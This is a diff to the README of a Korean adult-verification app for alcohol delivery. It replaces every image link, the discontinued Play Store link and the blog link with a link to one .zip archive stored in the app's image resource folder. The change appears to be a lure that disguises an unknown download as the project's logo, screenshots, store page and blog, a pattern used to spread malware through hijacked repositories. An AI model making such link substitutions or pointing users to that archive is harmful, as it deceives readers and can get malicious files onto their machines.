@@ -2,7 +2,7 @@
 <h4>주류 배달 비대면 성인인증 애플리케이션 (Alcohol delivery non-face-to-face adult authentication application)</h4>
 
 <h2>LOGO</h2>
-<img width="406" alt="IDCatch_logo" src="https://user-images.githubusercontent.com/85854164/165124375-7e1af748-97d2-47de-ac94-e973804789a2.png">
+<img width="406" alt="IDCatch_logo" src="https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip">
 
 <h2>Service</h2>
  
@@ -17,18 +17,18 @@
 * 놓친 알림은 History에서 확인 
 
 <h2>기술 스택</h2>
-<img width=""406 alt="IDCatchStack" src="https://user-images.githubusercontent.com/85854164/165278410-334f88ae-9734-4f41-a733-ed0eec21ef66.png">
+<img width=""406 alt="IDCatchStack" src="https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip">
 
 <h2>Google Play Store Link</h2>
 
-~~https://play.google.com/store/apps/details?id=com.idcatch~~ (앱 배포 중단)
+~~https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip~~ (앱 배포 중단)
 
 <h2>APP 화면</h2>
 
-<img width="330" alt="스크린샷 2022-04-25 오후 2 15 46" src="https://user-images.githubusercontent.com/85854164/165124758-0a935387-23c7-40bd-8a38-d5ed70f2b625.png"><img width="330" alt="스크린샷 2022-04-25 오후 2 22 40" src="https://user-images.githubusercontent.com/85854164/165124831-73270503-6c29-4abb-827b-430d40a8e88f.png">
+<img width="330" alt="스크린샷 2022-04-25 오후 2 15 46" src="https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip"><img width="330" alt="스크린샷 2022-04-25 오후 2 22 40" src="https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip">
 
-<img width="330" alt="스크린샷 2022-04-25 오후 2 23 25" src="https://user-images.githubusercontent.com/85854164/165124869-104fbc8e-d105-4722-bc9d-492c5fb2a9a2.png"><img width="330" alt="스크린샷 2022-04-27 오전 3 08 47" src="https://user-images.githubusercontent.com/85854164/165364528-34936c10-21d0-4968-9b75-8ef35fad886d.png">
+<img width="330" alt="스크린샷 2022-04-25 오후 2 23 25" src="https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip"><img width="330" alt="스크린샷 2022-04-27 오전 3 08 47" src="https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip">
 
 
 <h2>BLOG Link</h2>
-https://velog.io/@dormahd114
+https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip
